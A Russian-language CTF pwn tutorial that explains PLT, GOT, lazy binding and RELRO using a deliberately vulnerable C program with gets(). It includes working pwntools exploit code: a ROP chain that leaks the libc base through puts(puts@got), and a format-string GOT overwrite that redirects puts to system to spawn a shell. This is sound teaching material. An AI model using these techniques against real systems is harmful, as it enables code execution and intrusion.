## Вопрос, с которого всё начинается

Ты разобрал ROP и умеешь утекать адрес libc вызовом `puts`. Но почему `puts` вообще вызывается по адресу, который ты не знаешь? В бинаре нет адреса `puts` — libc грузится по случайному адресу каждый запуск. И всё же программа как-то находит нужную функцию.

Сегодня разберём, как это устроено, — и заодно превратим этот механизм в инструмент: через него мы **утекаем** адрес libc и **перехватываем** вызовы функций.

## Наш пример: маленький бинарь, который печатает

```c
// chall.c
#include <stdio.h>
int main(void) {
    char buf[64];
    puts("Input:");
    gets(buf);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ checksec --file=./chall
    Arch:     amd64-64-little
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RELRO:    Partial RELRO
```

Вопрос на весь урок: `puts` живёт в libc, которая загружается по случайному адресу. Как `main` узнаёт, куда прыгать? И что это даёт нам как атакующим?

## Шаг 1. Два мира: наш код и чужой

Наш `main` и `puts` из libc — разные файлы, собранные отдельно. Когда линкер собирает `chall`, он **не знает** конечного адреса `puts`: libc подключается только при запуске, да ещё и по случайному адресу (это ASLR — рандомизация адресного пространства, которую мы разбирали в митигациях).

Решение линкера простое и гениальное: он оставляет в нашем коде маленький **трамплин** с фиксированным адресом, который умеет прыгать «куда надо». А «куда надо» записывается в отдельную **таблицу** во время запуска.

## Шаг 2. PLT — трамплин

Посмотрим, во что компилятор превратил вызов `puts("Input:")`:

```bash
$ objdump -d -M intel ./chall | grep -A4 '<puts@plt>'
0000000000401030 <puts@plt>:
  401030: jmp    QWORD PTR [rip+0x2f39]   # 0x403f70 <puts@got.plt>
  401036: push   0x0
  401037: jmp    401020 <_init+0x20>
```

Разберём по строчкам.

Первая инструкция — `jmp QWORD PTR [rip+0x2f39]`. Это «прыгни по адресу, который лежит в памяти по смещению». Адрес памяти — `0x403f70`. **PLT** (Procedure Linkage Table) — это таблица таких трамплинов, по одному на каждую внешнюю функцию.

Если бы `puts` уже был разрешён, эта первая инструкция сразу прыгнула бы в libc. Но при первом вызове там ещё ничего нет, и управление идёт на `push 0x0` — это номер символа `puts` в таблице. Дальше прыжок на `_init+0x20`, то есть в резолвер `_dl_runtime_resolve`.

## Шаг 3. GOT — таблица адресов

`GOT` (Global Offset Table) — таблица в сегменте данных, где хранятся **абсолютные адреса**. Ячейка `puts@got` по адресу `0x403f70` изначально указывает обратно внутрь PLT. Резолвер, увидев номер символа, находит `puts` в загруженной libc, **записывает её реальный адрес** в `puts@got` и передаёт туда управление.

Со второго вызова всё проще: первая инструкция `jmp [puts@got]` уже попадает прямо в libc. Резолвер больше не нужен.

Проверить обе таблицы можно из pwntools:

```python
>>> from pwn import *
>>> elf = ELF('./chall')
>>> hex(elf.plt['puts'])
'0x401030'
>>> hex(elf.got['puts'])
'0x403f70'
```

`elf.plt['puts']` — адрес трамплина (фиксированный, его кладём в ROP-цепочку). `elf.got['puts']` — адрес ячейки, в которой лежит настоящий адрес `puts` в libc.

## Шаг 4. RELRO: можно ли переписать GOT?

Раз GOT — просто память, возникает соблазн её переписать. Защита от этого называется **RELRO** (RELocation Read-Only):

| RELRO | GOT | Ленивое связывание |
|---|---|---|
| No RELRO | writable | да |
| Partial RELRO | writable | да (обычно) |
| Full RELRO | read-only | нет |

При **Partial RELRO** (наш случай) GOT остаётся записываемым — это и есть цель атак. При **Full RELRO** линкер разрешает все символы на старте и переводит GOT в режим «только чтение» — перезапись невозможна.

Проверяем сами:

```bash
$ readelf -l ./chall | grep -i relro
  GNU_RELRO      0x002dd0 0x00402dd0 0x00402dd0 0x000230 ...
```

## Шаг 5. Утечка libc через GOT

Вот главный практический приём. У нас есть `puts@plt` и мы можем через ROP положить в `rdi` произвольное значение. Что если вызвать `puts(puts@got)`? Функция напечатает **содержимое ячейки GOT** — а это и есть реальный адрес `puts` в libc.

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])   # puts(puts@got) -> печатает адрес
rop.call(elf.symbols['main'])                  # вернуться в main для второго раунда

p = process('./chall')
p.sendlineafter(b'Input:\n', flat({72: rop.chain()}))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']     # база libc = адрес - оффсет
log.success(f'libc @ {hex(libc.address)}')
```

```text
[+] libc @ 0x7ffff7dc0000
```

Разберём ключевые места. `ljust(8, b'\x00')` дополняет утечку до 8 байт нулями: `puts` останавливается на первом нулевом байте, поэтому строка может оказаться короче восьми. Вычитая из утёкшего адреса **оффсет** `puts` в libc (его мы знаем из файла libc), получаем базу — адрес, от которого считаются все остальные функции.

Если `puts` недоступен, ту же утечку делают через `write(1, write@got, 8)` — `write` печатает ровно 8 байт и не спотыкается о нули.

## Шаг 6. Перехват вызова: запись в GOT

Утечка — только половина. Вторая половина — **записать** что-нибудь в GOT. Если у нас есть примитив произвольной записи (например, format string из урока про `pwn-format-string`), можно положить адрес `system` в ячейку `puts@got`. Тогда следующий вызов `puts(x)` на самом деле вызовет `system(x)` — и если `x` равна строке `/bin/sh`, мы получим shell.

```python
payload = fmtstr_payload(6, {elf.got['puts']: libc.symbols['system']})
p.sendline(payload)     # puts@got := system
p.sendline(b'/bin/sh')  # аргумент для puts -> на деле system
p.interactive()
```

Порядок обязателен: сначала **утечка** libc (иначе не знаем адрес `system`), потом **запись**, потом подаём строку-аргумент.

## На что смотреть дальше

- **Full RELRO** закрывает GOT. Тогда цель смещается на хуки (`__free_hook` до glibc 2.34), FSOP и `__exit_funcs` — про это в `pwn-fsop` и `pwn-exit-handlers`.
- **Младшие 12 бит** адреса символа не зависят от ASLR. Утечка одного `puts` даёт только page offset — для точной версии libc сверяют два-три символа (см. `pwn-libc-database`).
- **PIE + Partial RELRO**: `elf.got[...]` вернёт смещение, а не абсолютный адрес. После утечки базы кода не забудь задать `elf.address`.
- **Неинициализированные GOT-записи**: до первого вызова ячейка указывает на PLT+6. Это используют, чтобы подменить индекс символа у резолвера.

## Что мы теперь знаем

- PLT — таблица трамплинов; GOT — таблица реальных адресов.
- При первом вызове работает ленивый резолвер, дальше — прямой переход через GOT.
- `puts(puts@got)` печатает адрес `puts` в libc → вычитаем оффсет → получаем базу.
- Partial RELRO позволяет переписать GOT; Full RELRO — нет.
- Запись `system` в `puts@got` превращает `puts(x)` в `system(x)`.

## Куда дальше

В следующем уроке `pwn-ret2libc` мы возьмём эту утечку и доведём её до `system("/bin/sh")`: соберём вторую цепочку уже с точными адресами libc. А пока запомни главное: **PLT — трамплин, GOT — адрес; `puts(got)` отдаёт адрес libc, а запись в GOT перехватывает вызов.**

## Где пригодится

- **CTF Pwn:** утечка libc через GOT — стандартный первый шаг при ASLR.
- **Реверс:** понимание PLT/GOT критично для анализа нативных бинарников и малвари.
- **Эксплуатация реальных CVE:** перезапись GOT-записей (`free_hook`/`malloc_hook` в старых glibc) — классика.
- **Работа:** анализ динамической линковки, разбор крэш-дампов, secure coding (Full RELRO как мера защиты).
